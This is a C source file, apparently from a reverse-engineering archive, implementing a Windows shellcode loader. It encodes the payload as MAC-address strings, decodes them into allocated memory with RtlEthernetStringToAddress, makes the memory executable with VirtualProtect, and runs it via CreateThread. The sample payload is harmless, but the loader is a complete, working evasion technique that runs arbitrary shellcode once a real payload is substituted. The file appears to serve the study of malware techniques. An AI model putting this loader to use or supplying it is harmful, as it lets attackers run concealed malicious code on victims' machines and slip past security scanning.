/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlEthernetStringToAddress
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <ip2string.h>

#pragma comment(lib,"ntdll")

/* ========= some definition ========= */
union _DL_OUI {
  UINT8 Byte[3];
  struct {
    UINT8 Group:1;
    UINT8 Local:1;
  };
};
typedef union _DL_OUI DL_OUI, *PDL_OUI;

union _DL_EI48 {
  UINT8 Byte[3];
};
typedef union _DL_EI48 DL_EI48, *PDL_EI48;

union _DL_EUI48 {
  UINT8 Byte[6];
  struct {
    DL_OUI Oui;
    DL_EI48 Ei48;
  };
};


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    char *      payload []  = { "90-90-CC-C3-00-00" };
    uint32_t    nitem       = 1;

    uint32_t    idx;
    DL_EUI48 *  mac;
    PCSTR       terminator = "";

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, nitem * 6, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    mac = (DL_EUI48*) runtime;
    for (uint32_t idx = 0; idx < nitem; idx++, mac++)
    {
        RtlEthernetStringToAddress (payload[idx], &terminator, mac);
    }

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, nitem * 6, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}